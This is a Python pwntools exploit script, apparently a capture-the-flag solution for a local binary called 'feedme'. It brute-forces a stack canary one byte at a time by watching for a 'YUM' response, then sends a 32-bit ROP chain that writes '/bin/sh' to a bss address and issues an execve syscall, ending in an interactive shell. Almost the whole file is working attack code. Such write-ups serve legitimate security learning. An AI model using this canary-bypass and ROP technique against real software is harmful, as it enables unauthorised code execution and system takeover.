from pwn import *

def breakCanary():
	# first byte of the stack canary has to be \x00
	known_canary = "\x00"
	# Ascii representation of the canary
	hex_canary = "00"
	# The current canary which will be incremented
	canary = 0x0
	# The number of bytes we will give as input (The single byte input!)
	inp_bytes = 34
	# Iterate 3 times for the three bytes we need to brute force
	for j in range(0, 3):
		for i in xrange(0xff):
			#print "---------------------------------"
			log.info("Trying canary: " + hex(canary) + hex_canary) 
			
			# Send the current input size
			target.send(p32(inp_bytes)[0])

			# Send this iterations canary
			target.send("0"*0x20 + known_canary + p32(canary)[0])

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil("exit.")
			#print output
			if "YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print "next byte is: " + hex(canary)
				known_canary = known_canary + p32(canary)[0]
				inp_bytes = inp_bytes + 1
				new_canary = hex(canary)
				new_canary = new_canary.replace("0x", "")
				hex_canary = new_canary + hex_canary
				canary = 0x0
				break
			else:
				# If this isn't the canary value, increment canary by one and move onto next loop
				canary = canary + 0x1

	# Return the canary
	return int(hex_canary, 16)

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info("The canary is: " + hex(canary))


# Now that we have the canary, we can start making our final payload

# This will cover the space up to, and including the canary
payload = "0"*0x20 + p32(canary)

# This will cover the rest of the space between the canary and the return address
payload += "1"*12

# Start putting together the ROP Chain

# This is to write the string '/bin' to the bss address 0x80e9b00. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80e9b00)	# bss address
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x6e69622f)	# /bin string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Write the second half of the string '/bin/sh' the '/sh' to 0x80e9b00 + 0x4
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0x80e9b00 + 0x4)	# bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)	# pop edx
payload	+= p32(0x0068732f)	# /sh string in hex, in little endian
payload += p32(0x0807be31)	# mov dword ptr [eax], edx ; ret

# Now that we have the string '/bin/sh' written to 0x80e9b00, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
payload += p32(0x080bb496)	# pop eax ; ret
payload += p32(0xb)			# 11
payload += p32(0x0806f371)	# pop ecx ; pop ebx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x80e9b00)	# bss address
payload += p32(0x0806f34a)	# pop edx ; ret
payload += p32(0x0)			# 0x0
payload += p32(0x8049761)	# syscall

# Send the amount of bytes for our payload, and the payload itself

target.send(p32(len(payload))[0])
target.send(payload)

# Drop to an interactive shell
target.interactive()